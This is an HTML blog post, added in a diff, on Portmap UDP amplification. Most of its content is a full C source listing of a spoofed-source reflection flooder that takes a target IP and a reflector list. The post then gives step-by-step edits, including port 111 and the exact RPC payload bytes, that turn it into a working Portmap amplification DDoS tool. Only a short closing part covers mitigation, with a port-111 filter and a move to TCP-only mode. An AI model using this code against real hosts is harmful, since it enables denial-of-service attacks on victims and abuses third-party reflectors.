@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>Portmap amplification</title>
+    <meta name="description" content="" />
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="shortcut icon" href="//dosattack.net/themes/Casper/favicon.ico">
+
+    <link rel="stylesheet" type="text/css" href="//dosattack.net/themes/Casper/assets/css/screen.css?v=1.0.0" />
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400" />
+
+    <link rel="canonical" href="http://dosattack.net/2015/12/13/Portmap-amplification.html" />
+    
+    <meta property="og:site_name" content="Adam Syed" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Portmap amplification" />
+    <meta property="og:description" content="While this post is a bit late, man I am lazy, the timing of it reflects on the danger of it. Portmap? Portmap is a pretty cool program showing information but I&amp;#8217;m not here to talk about that,..." />
+    <meta property="og:url" content="http://dosattack.net/2015/12/13/Portmap-amplification.html" />
+    <meta property="article:published_time" content="2015-12-13T08:00:00.000Z" />
+    <meta property="article:modified_time" content="2015-12-14T06:08:42.942Z" />
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="Portmap amplification" />
+    <meta name="twitter:description" content="While this post is a bit late, man I am lazy, the timing of it reflects on the danger of it. Portmap? Portmap is a pretty cool program showing information but I&amp;#8217;m not here to talk about that,..." />
+    <meta name="twitter:url" content="http://dosattack.net/2015/12/13/Portmap-amplification.html" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "Article",
+    "publisher": "Adam Syed",
+    "author": {
+        "@type": "Person",
+        "name": "Adam Syed",
+        "image": "https://avatars.githubusercontent.com/u/3879307?v=3",
+        "url": "undefined/author/undefined",
+        "sameAs": "http://dosattack.net/"
+    },
+    "headline": "Portmap amplification",
+    "url": "http://dosattack.net/2015/12/13/Portmap-amplification.html",
+    "datePublished": "2015-12-13T08:00:00.000Z",
+    "dateModified": "2015-12-14T06:08:42.942Z",
+    "description": "While this post is a bit late, man I am lazy, the timing of it reflects on the danger of it. Portmap? Portmap is a pretty cool program showing information but I&amp;#8217;m not here to talk about that,..."
+}
+    </script>
+
+    <meta name="generator" content="Ghost ?" />
+    <link rel="alternate" type="application/rss+xml" title="Adam Syed" href="http://dosattack.net/rss" />
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/styles/default.min.css">
+</head>
+<body class="post-template">
+
+    
+
+
+<header class="main-header post-head no-cover">
+    <nav class="main-nav  clearfix">
+        <a class="back-button icon-arrow-left" href="http://dosattack.net">Home</a>
+        <!-- <a class="subscribe-button icon-feed" href="http://dosattack.net/rss/">Subscribe</a> -->
+    </nav>
+</header>
+
+<main class="content" role="main">
+
+    <article class="post">
+
+        <header class="post-header">
+            <h1 class="post-title">Portmap amplification</h1>
+            <section class="post-meta">
+                <time class="post-date" datetime="2015-12-13">13 December 2015</time> 
+            </section>
+        </header>
+
+        <section class="post-content">
+            <div id="preamble">
+<div class="sectionbody">
+<div class="paragraph">
+<p>While this post is a bit late, man I am lazy, the timing of it reflects on the danger of it.</p>
+</div>
+</div>
+</div>
+<div class="sect4">
+<h5 id="_portmap">Portmap?</h5>
+<div class="paragraph">
+<p>Portmap is a pretty cool program showing information but I&#8217;m not here to talk about that, you can always just check them out yourself (<a href="http://linux.die.net/man/8/portmap" class="bare">http://linux.die.net/man/8/portmap</a>).</p>
+</div>
+<div class="sect5">
+<h6 id="_what_s_the_danger_of_this_amplification_method">What&#8217;s the danger of this amplification method?</h6>
+<div class="paragraph">
+<p>Portmap&#8217;s amplification method has an amplification rate of 7-28x as stated by US-Certs (<a href="https://www.us-cert.gov/ncas/alerts/TA14-017A" class="bare">https://www.us-cert.gov/ncas/alerts/TA14-017A</a>) but seen in the wild to have a value of 1348 bytes (19.8x).</p>
+</div>
+</div>
+<div class="sect5">
+<h6 id="_how_can_this_even_be_possible">How can this even be possible!?</h6>
+<div class="paragraph">
+<p>UDP amplification is a fairly simple thing!</p>
+</div>
+<div class="paragraph">
+<p>Essentially you search for a function that is externally accessible and responds with a bigger packet than one you send, in this case that is "Portmap"!</p>
+</div>
+<div class="paragraph">
+<p>Let&#8217;s start by grabbing a script off the internet to show how easy UDP amplification is shall we?</p>
+</div>
+<div class="paragraph">
+<p><a href="http://lmgtfy.com/?q=site%3Apastebin.com+SSDP.c" class="bare">http://lmgtfy.com/?q=site%3Apastebin.com+SSDP.c</a></p>
+</div>
+<div class="paragraph">
+<p>We then click the first one and <strong>BAM</strong> you&#8217;ve got a script that does UDP amplification but wait, this won&#8217;t be ready just yet.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>#include &lt;time.h&gt;
+#include &lt;pthread.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/ip.h&gt;
+#include &lt;netinet/udp.h&gt;
+#include &lt;arpa/inet.h&gt;
+#define MAX_PACKET_SIZE 8192
+#define PHI 0x9e3779b9
+static uint32_t Q[4096], c = 362436;
+struct list
+{
+        struct sockaddr_in data;
+        struct list *next;
+        struct list *prev;
+};
+struct list *head;
+struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
+void init_rand(uint32_t x)
+{
+        int i;
+        Q[0] = x;
+        Q[1] = x + PHI;
+        Q[2] = x + PHI + PHI;
+        for (i = 3; i &lt; 4096; i++)
+        {
+                Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
+        }
+}
+uint32_t rand_cmwc(void)
+{
+        uint64_t t, a = 18782LL;
+        static uint32_t i = 4095;
+        uint32_t x, r = 0xfffffffe;
+        i = (i + 1) &amp; 4095;
+        t = a * Q[i] + c;
+        c = (t &gt;&gt; 32);
+        x = t + c;
+        if (x &lt; c) {
+                x++;
+                c++;
+        }
+        return (Q[i] = r - x);
+}
+/* function for header checksums */
+unsigned short csum (unsigned short *buf, int nwords)
+{
+        unsigned long sum;
+        for (sum = 0; nwords &gt; 0; nwords--)
+        sum += *buf++;
+        sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);
+        sum += (sum &gt;&gt; 16);
+        return (unsigned short)(~sum);
+}
+void setup_ip_header(struct iphdr *iph)
+{
+        iph-&gt;ihl = 5;
+        iph-&gt;version = 4;
+        iph-&gt;tos = 0;
+        iph-&gt;tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 90;
+        iph-&gt;id = htonl(54321);
+        iph-&gt;frag_off = 0;
+        iph-&gt;ttl = MAXTTL;
+        iph-&gt;protocol = IPPROTO_UDP;
+        iph-&gt;check = 0;
+        iph-&gt;saddr = inet_addr("192.168.3.100");
+}
+void setup_udp_header(struct udphdr *udph)
+{
+        udph-&gt;source = htons(5678);
+        udph-&gt;dest = htons(1900);
+        udph-&gt;check = 0;
+        strcpy((void *)udph + sizeof(struct udphdr), "M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:\"ssdp:discover\"\r\nMX:3\r\n\r\n");
+        udph-&gt;len=htons(sizeof(struct udphdr) + 90);
+}
+void *flood(void *par1)
+{
+        struct thread_data *td = (struct thread_data *)par1;
+        char datagram[MAX_PACKET_SIZE];
+        struct iphdr *iph = (struct iphdr *)datagram;
+        struct udphdr *udph = (/*u_int8_t*/void *)iph + sizeof(struct iphdr);
+        struct sockaddr_in sin = td-&gt;sin;
+        struct  list *list_node = td-&gt;list_node;
+        int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+        if(s &lt; 0){
+                fprintf(stderr, "Could not open raw socket.\n");
+                exit(-1);
+        }
+        init_rand(time(NULL));
+        memset(datagram, 0, MAX_PACKET_SIZE);
+        setup_ip_header(iph);
+        setup_udp_header(udph);
+        udph-&gt;source = sin.sin_port;
+        iph-&gt;saddr = sin.sin_addr.s_addr;
+        iph-&gt;daddr = list_node-&gt;data.sin_addr.s_addr;
+        iph-&gt;check = csum ((unsigned short *) datagram, iph-&gt;tot_len &gt;&gt; 1);
+        int tmp = 1;
+        const int *val = &amp;tmp;
+        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) &lt; 0){
+                fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
+                exit(-1);
+        }
+        int i=0;
+        while(1){
+                sendto(s, datagram, iph-&gt;tot_len, 0, (struct sockaddr *) &amp;list_node-&gt;data, sizeof(list_node-&gt;data));
+                list_node = list_node-&gt;next;
+                iph-&gt;daddr = list_node-&gt;data.sin_addr.s_addr;
+                iph-&gt;check = csum ((unsigned short *) datagram, iph-&gt;tot_len &gt;&gt; 1);
+                if(i==5)
+                {
+                        usleep(0);
+                        i=0;
+                }
+                i++;
+        }
+}
+int main(int argc, char *argv[ ])
+{
+        if(argc &lt; 4){
+                fprintf(stderr, "Invalid parameters!\n");
+                fprintf(stdout, "Usage: %s &lt;target IP&gt; &lt;target port&gt; &lt;reflection file&gt; &lt;throttle&gt; &lt;time (optional)&gt;\n", argv[0]);
+                exit(-1);
+        }
+        int i = 0;
+        head = NULL;
+        fprintf(stdout, "Setting up Sockets...\n");
+        int max_len = 128;
+        char *buffer = (char *) malloc(max_len);
+        buffer = memset(buffer, 0x00, max_len);
+        int num_threads = atoi(argv[4]);
+        FILE *list_fd = fopen(argv[3],  "r");
+        while (fgets(buffer, max_len, list_fd) != NULL) {
+                if ((buffer[strlen(buffer) - 1] == '\n') ||
+                                (buffer[strlen(buffer) - 1] == '\r')) {
+                        buffer[strlen(buffer) - 1] = 0x00;
+                        if(head == NULL)
+                        {
+                                head = (struct list *)malloc(sizeof(struct list));
+                                bzero(&amp;head-&gt;data, sizeof(head-&gt;data));
+                                head-&gt;data.sin_addr.s_addr=inet_addr(buffer);
+                                head-&gt;next = head;
+                                head-&gt;prev = head;
+                        } else {
+                                struct list *new_node = (struct list *)malloc(sizeof(struct list));
+                                memset(new_node, 0x00, sizeof(struct list));
+                                new_node-&gt;data.sin_addr.s_addr=inet_addr(buffer);
+                                new_node-&gt;prev = head;
+                                new_node-&gt;next = head-&gt;next;
+                                head-&gt;next = new_node;
+                        }
+                        i++;
+                } else {
+                        continue;
+                }
+        }
+        struct list *current = head-&gt;next;
+        pthread_t thread[num_threads];
+        struct sockaddr_in sin;
+        sin.sin_family = AF_INET;
+        sin.sin_port = htons(atoi(argv[2]));
+        sin.sin_addr.s_addr = inet_addr(argv[1]);
+        struct thread_data td[num_threads];
+        for(i = 0;i&lt;num_threads;i++){
+                td[i].thread_id = i;
+                td[i].sin= sin;
+                td[i].list_node = current;
+                pthread_create( &amp;thread[i], NULL, &amp;flood, (void *) &amp;td[i]);
+        }
+        fprintf(stdout, "Starting Flood...\n");
+        if(argc &gt; 5)
+        {
+                sleep(atoi(argv[5]));
+        } else {
+                while(1){
+                        sleep(1);
+                }
+        }
+        return 0;
+}</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Now that we have the script let&#8217;s get working on it!</p>
+</div>
+<div class="paragraph">
+<p>First let&#8217;s take a look at the IP header function -</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>void setup_ip_header(struct iphdr *iph)
+{
+        iph-&gt;ihl = 5;
+        iph-&gt;version = 4;
+        iph-&gt;tos = 0;
+        iph-&gt;tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 90;
+        iph-&gt;id = htonl(54321);
+        iph-&gt;frag_off = 0;
+        iph-&gt;ttl = MAXTTL;
+        iph-&gt;protocol = IPPROTO_UDP;
+        iph-&gt;check = 0;
+        iph-&gt;saddr = inet_addr("192.168.3.100");
+}</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Now you&#8217;ll see that we need to change some stuff! The size of the payload for Portmap is "40" instead of "90" so we&#8217;ve gotta change that -</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>iph-&gt;tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 40;</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>then let&#8217;s change the port to Portmap&#8217;s port (111) -</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>udph-&gt;dest = htons(111);</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>and finally change the payload! but wait&#8230;&#8203;who actually uses strcpy anymore if we know the payload size? Let&#8217;s just change that real quick!</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>memcpy((void *)udph + sizeof(struct udphdr), "\x65\x72\x0A\x37\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xA0\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 40);</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Then finally change</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>udph-&gt;len=htons(sizeof(struct udphdr) + 40);</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>and we&#8217;re set to go!</p>
+</div>
+<div class="paragraph">
+<p>Simple, right? That&#8217;s exactly the problem&#8230;&#8203;Amplification nowadays is so easy that anybody with half a brain could do it! so how do we stop this? Well one way is to just block source port 111! (<a href="http://dosattack.net/2015/09/13/Lets-talk-about-mitigation.html" class="bare">http://dosattack.net/2015/09/13/Lets-talk-about-mitigation.html</a>)
+as said in our other post</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>ethtool --config-ntuple eth flow-type udp4 src-port 111 action -1</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Portmap also functions on both UDP and TCP so if you&#8217;re running a system that has it (~5 million devices) then switch to TCP-only mode and help ease the amount of traffic by closing off more reflectors!</p>
+</div>
+<div class="paragraph">
+<p>I&#8217;ve personally taken the effort to email one of my favorite sites to monitor these types of amplification vectors to tell them to add it, <a href="https://www.shadowserver.org/wiki/" class="bare">https://www.shadowserver.org/wiki/</a>.</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="https://i.imgur.com/WMJKGfx.png" alt="WMJKGfx.png">
+</div>
+</div>
+<div class="paragraph">
+<p>(We&#8217;ll miss you Mailbox D: )</p>
+</div>
+<div class="paragraph">
+<p>I&#8217;ll put more effort into this post as the issue arises more but as we saw by a post by Level3 (blog.level3.com/security/a-new-ddos-reflection-attack-portmapper-an-early-warning-to-the-industry/)</p>
+</div>
+<div class="paragraph">
+<p>Portmap is such a little threat that it barely shows up on their graphs of UDP amplification attacks (which I&#8217;m shocked to see that DNS amplification is higher than SSDP on)</p>
+</div>
+<div class="imageblock">
+<div class="content">
+<img src="http://blog.level3.com/wp-content/uploads/2015/08/reflection-highres-1024x531.jpg" alt="reflection highres 1024x531.jpg">
+</div>
+</div>
+</div>
+</div>
+        </section>
+
+        <footer class="post-footer">
+
+
+            <figure class="author-image">
+                <a class="img" href="" style="background-image: url(https://avatars.githubusercontent.com/u/3879307?v=3)"><span class="hidden">Adam Syed's Picture</span></a>
+            </figure>
+
+            <section class="author">
+                <h4><a href="">Adam Syed</a></h4>
+
+                    <p>Read <a href="">more posts</a> by this author.</p>
+                <div class="author-meta">
+                    <span class="author-location icon-location">California</span>
+                    <span class="author-link icon-link"><a href="http://dosattack.net/">http://dosattack.net/</a></span>
+                </div>
+            </section>
+
+
+            <section class="share">
+                <h4>Share this post</h4>
+                <a class="icon-twitter" href="https://twitter.com/share?text=Portmap%20amplification&amp;url=http://dosattack.net/2015/12/13/Portmap-amplification.html"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <span class="hidden">Twitter</span>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://dosattack.net/2015/12/13/Portmap-amplification.html"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <span class="hidden">Facebook</span>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=http://dosattack.net/2015/12/13/Portmap-amplification.html"
+                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <span class="hidden">Google+</span>
+                </a>
+            </section>
+
+        </footer>
+
+
+    </article>
+
+</main>
+
+
+
+    <footer class="site-footer clearfix">
+        <section class="copyright"><a href="http://dosattack.net">Adam Syed</a> &copy; 2015</section>
+        <section class="poweredby">Proudly published with <a href="http://hubpress.io">HubPress</a></section>
+    </footer>
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.9.0/moment-with-locales.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/highlight.min.js?v="></script> 
+      <script type="text/javascript">
+        jQuery( document ).ready(function() {
+          // change date with ago
+          jQuery('ago.ago').each(function(){
+            var element = jQuery(this).parent();
+            element.html( moment(element.text()).fromNow());
+          });
+        });
+
+        hljs.initHighlightingOnLoad();      
+      </script>
+
+    <script type="text/javascript" src="//dosattack.net/themes/Casper/assets/js/jquery.fitvids.js?v=1.0.0"></script>
+    <script type="text/javascript" src="//dosattack.net/themes/Casper/assets/js/index.js?v=1.0.0"></script>
+
+</body>
+</html>
